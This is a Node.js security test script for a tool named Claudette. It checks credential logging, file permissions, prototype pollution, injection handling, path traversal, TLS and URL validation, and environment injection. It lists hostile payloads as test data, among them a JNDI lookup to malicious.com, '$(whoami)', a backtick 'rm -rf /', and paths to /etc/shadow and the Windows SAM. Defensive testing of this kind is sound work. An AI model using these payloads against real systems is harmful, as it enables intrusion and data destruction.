#!/usr/bin/env node

/**
 * Agent 5: Comprehensive Security and Configuration Validation Test
 * 
 * Tests security vulnerabilities, credential handling, and configuration safety
 * for Claudette v3.0.0
 */

require('dotenv').config();
const { Claudette } = require('./dist/index.js');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

class SecurityValidator {
    constructor() {
        this.results = {
            timestamp: new Date().toISOString(),
            claudette_version: '3.0.0',
            test_environment: 'Agent 5 Security Validation',
            summary: {
                total_tests: 0,
                passed: 0,
                failed: 0,
                critical_vulnerabilities: 0,
                warnings: 0,
                security_score: 0
            },
            categories: {
                credential_security: { tests: [], score: 0 },
                configuration_security: { tests: [], score: 0 },
                injection_attacks: { tests: [], score: 0 },
                file_system_security: { tests: [], score: 0 },
                network_security: { tests: [], score: 0 },
                process_security: { tests: [], score: 0 }
            },
            vulnerabilities: [],
            recommendations: []
        };
    }

    log(message) {
        console.log(`[Agent 5] ${message}`);
    }

    recordTest(category, name, passed, details = {}) {
        const test = {
            name,
            result: passed ? 'passed' : 'failed',
            timestamp: new Date().toISOString(),
            duration_ms: details.duration || 0,
            details: details
        };

        this.results.categories[category].tests.push(test);
        this.results.summary.total_tests++;
        
        if (passed) {
            this.results.summary.passed++;
        } else {
            this.results.summary.failed++;
            if (details.severity === 'critical') {
                this.results.summary.critical_vulnerabilities++;
                this.results.vulnerabilities.push({
                    category,
                    test: name,
                    severity: 'critical',
                    description: details.error || 'Critical vulnerability detected',
                    recommendation: details.recommendation || 'Immediate action required'
                });
            } else if (details.severity === 'warning') {
                this.results.summary.warnings++;
            }
        }
    }

    async testCredentialSecurity() {
        this.log('Testing credential security...');

        // Test 1: API key exposure in logs
        const startTime = Date.now();
        try {
            const claudette = new Claudette();
            
            // Capture console output to check for key leakage
            const originalLog = console.log;
            let loggedContent = '';
            console.log = (...args) => {
                loggedContent += args.join(' ') + '\n';
            };

            await claudette.initialize();
            
            console.log = originalLog;

            // Check if any API keys were logged
            const envKeys = ['OPENAI_API_KEY', 'FLEXCON_API_KEY', 'ANTHROPIC_API_KEY'];
            let keysExposed = false;
            
            for (const key of envKeys) {
                const keyValue = process.env[key];
                if (keyValue && loggedContent.includes(keyValue)) {
                    keysExposed = true;
                    break;
                }
            }

            this.recordTest('credential_security', 'API key exposure in logs', !keysExposed, {
                duration: Date.now() - startTime,
                severity: keysExposed ? 'critical' : 'info',
                error: keysExposed ? 'API keys exposed in console logs' : null,
                recommendation: keysExposed ? 'Sanitize all log outputs' : 'Good: No key exposure detected'
            });

            await claudette.cleanup();
        } catch (error) {
            this.recordTest('credential_security', 'API key exposure in logs', false, {
                duration: Date.now() - startTime,
                severity: 'warning',
                error: error.message,
                recommendation: 'Fix credential loading mechanism'
            });
        }

        // Test 2: Configuration file permissions
        const configPaths = [
            '.env',
            'claudette.config.json',
            path.join(require('os').homedir(), '.claude', 'claudette', 'config.json')
        ];

        for (const configPath of configPaths) {
            const testStartTime = Date.now();
            try {
                if (fs.existsSync(configPath)) {
                    const stats = fs.statSync(configPath);
                    const mode = stats.mode & parseInt('777', 8);
                    const isSecure = mode <= parseInt('600', 8); // Owner read/write only

                    this.recordTest('credential_security', `${configPath} permissions`, isSecure, {
                        duration: Date.now() - testStartTime,
                        severity: isSecure ? 'info' : 'warning',
                        error: isSecure ? null : `File permissions too permissive: ${mode.toString(8)}`,
                        recommendation: isSecure ? 'Good: Secure permissions' : 'Set file permissions to 600'
                    });
                }
            } catch (error) {
                this.recordTest('credential_security', `${configPath} permissions`, false, {
                    duration: Date.now() - testStartTime,
                    severity: 'warning',
                    error: error.message,
                    recommendation: 'Fix file permission checking'
                });
            }
        }
    }

    async testConfigurationSecurity() {
        this.log('Testing configuration security...');

        // Test 1: Configuration injection attacks
        const maliciousConfigs = [
            { __proto__: { polluted: true } },
            { "../../malicious": "path" },
            { "constructor": { "prototype": { "polluted": true } } }
        ];

        for (let i = 0; i < maliciousConfigs.length; i++) {
            const startTime = Date.now();
            try {
                const claudette = new Claudette();
                
                // Try to inject malicious config
                Object.assign(claudette.config, maliciousConfigs[i]);
                
                // Check if prototype pollution occurred
                const polluted = ({}).polluted || Object.prototype.polluted;
                
                this.recordTest('configuration_security', `Prototype pollution test ${i + 1}`, !polluted, {
                    duration: Date.now() - startTime,
                    severity: polluted ? 'critical' : 'info',
                    error: polluted ? 'Prototype pollution vulnerability detected' : null,
                    recommendation: polluted ? 'Implement proper object sanitization' : 'Good: No pollution detected'
                });

                await claudette.cleanup();
            } catch (error) {
                this.recordTest('configuration_security', `Prototype pollution test ${i + 1}`, true, {
                    duration: Date.now() - startTime,
                    severity: 'info',
                    error: null,
                    recommendation: 'Good: Malicious config rejected'
                });
            }
        }

        // Test 2: Configuration file validation
        const testConfigPath = path.join(process.cwd(), 'test-malicious-config.json');
        const maliciousConfig = {
            "backends": {
                "test": {
                    "enabled": true,
                    "api_key": "../../../etc/passwd",
                    "base_url": "javascript:alert('xss')",
                    "model": "<script>alert('xss')</script>"
                }
            }
        };

        const startTime = Date.now();
        try {
            fs.writeFileSync(testConfigPath, JSON.stringify(maliciousConfig));
            
            const claudette = new Claudette(testConfigPath);
            
            // Check if malicious values were properly sanitized
            const testBackend = claudette.config.backends?.test;
            const containsXSS = testBackend && (
                testBackend.base_url?.includes('javascript:') ||
                testBackend.model?.includes('<script>')
            );

            this.recordTest('configuration_security', 'Malicious config file handling', !containsXSS, {
                duration: Date.now() - startTime,
                severity: containsXSS ? 'critical' : 'info',
                error: containsXSS ? 'Malicious script content not sanitized' : null,
                recommendation: containsXSS ? 'Implement input sanitization' : 'Good: Config properly handled'
            });

            await claudette.cleanup();
            fs.unlinkSync(testConfigPath); // Cleanup
        } catch (error) {
            this.recordTest('configuration_security', 'Malicious config file handling', true, {
                duration: Date.now() - startTime,
                severity: 'info',
                error: null,
                recommendation: 'Good: Malicious config rejected'
            });
            
            if (fs.existsSync(testConfigPath)) {
                fs.unlinkSync(testConfigPath);
            }
        }
    }

    async testInjectionAttacks() {
        this.log('Testing injection attack vectors...');

        // Test various injection payloads
        const injectionPayloads = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "${jndi:ldap://malicious.com/exploit}",
            "../../../etc/passwd",
            "$(whoami)",
            "`rm -rf /`",
            "{{constructor.constructor('alert(1)')()}}",
            "${7*7}#{7*7}",
            "javascript:alert('XSS')",
            "\x00\x01\x02\x03\x04\x05\x06\x07"
        ];

        for (let i = 0; i < injectionPayloads.length; i++) {
            const payload = injectionPayloads[i];
            const startTime = Date.now();
            
            try {
                const claudette = new Claudette();
                
                // Test prompt injection
                const response = await claudette.optimize(payload, [], { bypass_optimization: true });
                
                // Check if payload was executed or processed unsafely
                const containsPayload = response.content?.includes(payload) || 
                                      response.metadata?.toString().includes(payload);

                this.recordTest('injection_attacks', `Injection payload ${i + 1}`, !containsPayload, {
                    duration: Date.now() - startTime,
                    severity: containsPayload ? 'critical' : 'info',
                    payload: payload.substring(0, 50) + '...',
                    error: containsPayload ? 'Injection payload not properly sanitized' : null,
                    recommendation: containsPayload ? 'Implement strict input validation' : 'Good: Payload handled safely'
                });

                await claudette.cleanup();
            } catch (error) {
                // Errors are expected for malicious inputs
                this.recordTest('injection_attacks', `Injection payload ${i + 1}`, true, {
                    duration: Date.now() - startTime,
                    severity: 'info',
                    payload: payload.substring(0, 50) + '...',
                    error: null,
                    recommendation: 'Good: Malicious input rejected'
                });
            }
        }
    }

    async testFileSystemSecurity() {
        this.log('Testing file system security...');

        // Test 1: Path traversal attempts
        const pathTraversalTests = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\config\\SAM',
            '....//....//....//etc/passwd'
        ];

        for (let i = 0; i < pathTraversalTests.length; i++) {
            const path = pathTraversalTests[i];
            const startTime = Date.now();
            
            try {
                const claudette = new Claudette(path); // Try to load config from malicious path
                
                this.recordTest('file_system_security', `Path traversal ${i + 1}`, false, {
                    duration: Date.now() - startTime,
                    severity: 'critical',
                    path: path,
                    error: 'Path traversal vulnerability - malicious path accepted',
                    recommendation: 'Implement path validation and canonicalization'
                });

                await claudette.cleanup();
            } catch (error) {
                this.recordTest('file_system_security', `Path traversal ${i + 1}`, true, {
                    duration: Date.now() - startTime,
                    severity: 'info',
                    path: path,
                    error: null,
                    recommendation: 'Good: Path traversal blocked'
                });
            }
        }

        // Test 2: Database file permissions
        const startTime = Date.now();
        try {
            const claudette = new Claudette();
            await claudette.initialize();
            
            const dbPath = claudette.db?.quotaPath || path.join(require('os').homedir(), '.claude', 'unified_costs.db');
            
            if (fs.existsSync(dbPath)) {
                const stats = fs.statSync(dbPath);
                const mode = stats.mode & parseInt('777', 8);
                const isSecure = mode <= parseInt('600', 8);

                this.recordTest('file_system_security', 'Database file permissions', isSecure, {
                    duration: Date.now() - startTime,
                    severity: isSecure ? 'info' : 'warning',
                    path: dbPath,
                    mode: mode.toString(8),
                    error: isSecure ? null : 'Database file permissions too permissive',
                    recommendation: isSecure ? 'Good: Secure permissions' : 'Set database file permissions to 600'
                });
            }

            await claudette.cleanup();
        } catch (error) {
            this.recordTest('file_system_security', 'Database file permissions', false, {
                duration: Date.now() - startTime,
                severity: 'warning',
                error: error.message,
                recommendation: 'Fix database permission checking'
            });
        }
    }

    async testNetworkSecurity() {
        this.log('Testing network security...');

        // Test 1: TLS certificate validation
        const startTime = Date.now();
        try {
            // Check if system properly validates HTTPS certificates
            const https = require('https');
            const options = {
                hostname: 'expired.badssl.com', // Known expired cert
                port: 443,
                path: '/',
                method: 'GET',
                rejectUnauthorized: true
            };

            const request = https.request(options, (response) => {
                this.recordTest('network_security', 'TLS certificate validation', false, {
                    duration: Date.now() - startTime,
                    severity: 'critical',
                    error: 'System accepts invalid/expired certificates',
                    recommendation: 'Ensure rejectUnauthorized is true for all HTTPS requests'
                });
            });

            request.on('error', (error) => {
                // Expected behavior - should reject invalid certs
                this.recordTest('network_security', 'TLS certificate validation', true, {
                    duration: Date.now() - startTime,
                    severity: 'info',
                    error: null,
                    recommendation: 'Good: Invalid certificates properly rejected'
                });
            });

            request.setTimeout(5000, () => {
                request.destroy();
                this.recordTest('network_security', 'TLS certificate validation', true, {
                    duration: Date.now() - startTime,
                    severity: 'info',
                    error: null,
                    recommendation: 'Good: Connection timeout (expected for expired cert test)'
                });
            });

            request.end();
        } catch (error) {
            this.recordTest('network_security', 'TLS certificate validation', false, {
                duration: Date.now() - startTime,
                severity: 'warning',
                error: error.message,
                recommendation: 'Fix TLS validation testing'
            });
        }

        // Test 2: URL validation in backend configurations
        const maliciousUrls = [
            'javascript:alert("xss")',
            'data:text/html,<script>alert("xss")</script>',
            'file:///etc/passwd',
            'ftp://malicious.com/exploit',
            'gopher://evil.com/exploit'
        ];

        for (let i = 0; i < maliciousUrls.length; i++) {
            const url = maliciousUrls[i];
            const urlStartTime = Date.now();
            
            try {
                const claudette = new Claudette();
                
                // Try to set malicious URL in backend config
                claudette.config.backends.test = {
                    enabled: true,
                    base_url: url,
                    api_key: 'test'
                };

                await claudette.initialize();
                
                // Check if malicious URL was accepted
                const acceptedMaliciousUrl = claudette.config.backends.test?.base_url === url;

                this.recordTest('network_security', `Malicious URL validation ${i + 1}`, !acceptedMaliciousUrl, {
                    duration: Date.now() - urlStartTime,
                    severity: acceptedMaliciousUrl ? 'critical' : 'info',
                    url: url,
                    error: acceptedMaliciousUrl ? 'Malicious URL accepted in configuration' : null,
                    recommendation: acceptedMaliciousUrl ? 'Implement URL protocol validation' : 'Good: Malicious URL handled'
                });

                await claudette.cleanup();
            } catch (error) {
                this.recordTest('network_security', `Malicious URL validation ${i + 1}`, true, {
                    duration: Date.now() - urlStartTime,
                    severity: 'info',
                    url: url,
                    error: null,
                    recommendation: 'Good: Malicious URL rejected'
                });
            }
        }
    }

    async testProcessSecurity() {
        this.log('Testing process security...');

        // Test 1: Process privilege check
        const startTime = Date.now();
        try {
            const isRoot = process.getuid && process.getuid() === 0;
            
            this.recordTest('process_security', 'Process privilege level', !isRoot, {
                duration: Date.now() - startTime,
                severity: isRoot ? 'critical' : 'info',
                uid: process.getuid ? process.getuid() : 'unknown',
                error: isRoot ? 'Process running with root privileges' : null,
                recommendation: isRoot ? 'Run process with minimal privileges' : 'Good: Non-privileged execution'
            });
        } catch (error) {
            this.recordTest('process_security', 'Process privilege level', false, {
                duration: Date.now() - startTime,
                severity: 'warning',
                error: error.message,
                recommendation: 'Fix privilege level checking'
            });
        }

        // Test 2: Environment variable pollution
        const originalEnv = { ...process.env };
        const pollutionStartTime = Date.now();
        
        try {
            // Test environment variable injection
            process.env.NODE_OPTIONS = '--inspect=0.0.0.0:9229';
            process.env.LD_PRELOAD = '/tmp/malicious.so';
            
            const claudette = new Claudette();
            await claudette.initialize();
            
            // Check if malicious environment variables affect the system
            const inspectorEnabled = process.debugPort > 0;
            
            this.recordTest('process_security', 'Environment variable pollution', !inspectorEnabled, {
                duration: Date.now() - pollutionStartTime,
                severity: inspectorEnabled ? 'critical' : 'info',
                error: inspectorEnabled ? 'Process vulnerable to environment variable injection' : null,
                recommendation: inspectorEnabled ? 'Sanitize environment variables' : 'Good: Environment pollution handled'
            });

            await claudette.cleanup();
            
            // Restore original environment
            process.env = originalEnv;
        } catch (error) {
            process.env = originalEnv;
            this.recordTest('process_security', 'Environment variable pollution', true, {
                duration: Date.now() - pollutionStartTime,
                severity: 'info',
                error: null,
                recommendation: 'Good: Environment pollution blocked'
            });
        }
    }

    calculateSecurityScore() {
        const categories = Object.keys(this.results.categories);
        let totalScore = 0;
        
        for (const category of categories) {
            const categoryTests = this.results.categories[category].tests;
            if (categoryTests.length > 0) {
                const passed = categoryTests.filter(t => t.result === 'passed').length;
                const categoryScore = (passed / categoryTests.length) * 100;
                this.results.categories[category].score = Math.round(categoryScore);
                totalScore += categoryScore;
            }
        }
        
        this.results.summary.security_score = Math.round(totalScore / categories.length);
    }

    async runAllTests() {
        this.log('Starting comprehensive security validation...');
        
        try {
            await this.testCredentialSecurity();
            await this.testConfigurationSecurity();
            await this.testInjectionAttacks();
            await this.testFileSystemSecurity();
            await this.testNetworkSecurity();
            await this.testProcessSecurity();
            
            this.calculateSecurityScore();
            
            // Add general recommendations
            this.results.recommendations = [
                'Implement comprehensive input validation and sanitization',
                'Add proper error handling for security violations',
                'Use secure file permissions (600) for sensitive files',
                'Validate all URLs and prevent malicious protocol usage',
                'Implement proper privilege separation',
                'Add security headers and TLS certificate validation',
                'Regular security audits and penetration testing'
            ];
            
            this.log(`Security validation completed. Score: ${this.results.summary.security_score}/100`);
            this.log(`Critical vulnerabilities: ${this.results.summary.critical_vulnerabilities}`);
            this.log(`Total tests: ${this.results.summary.total_tests} (${this.results.summary.passed} passed, ${this.results.summary.failed} failed)`);
            
        } catch (error) {
            this.log(`Error during security testing: ${error.message}`);
        }
    }

    generateReport() {
        const reportPath = path.join(process.cwd(), 'agent5-security-validation-report.json');
        fs.writeFileSync(reportPath, JSON.stringify(this.results, null, 2));
        this.log(`Security validation report saved to: ${reportPath}`);
        return reportPath;
    }
}

// Run the security validation
async function main() {
    const validator = new SecurityValidator();
    await validator.runAllTests();
    validator.generateReport();
    
    // Exit with appropriate code
    const exitCode = validator.results.summary.critical_vulnerabilities > 0 ? 1 : 0;
    process.exit(exitCode);
}

if (require.main === module) {
    main().catch(error => {
        console.error('Security validation failed:', error);
        process.exit(1);
    });
}

module.exports = { SecurityValidator };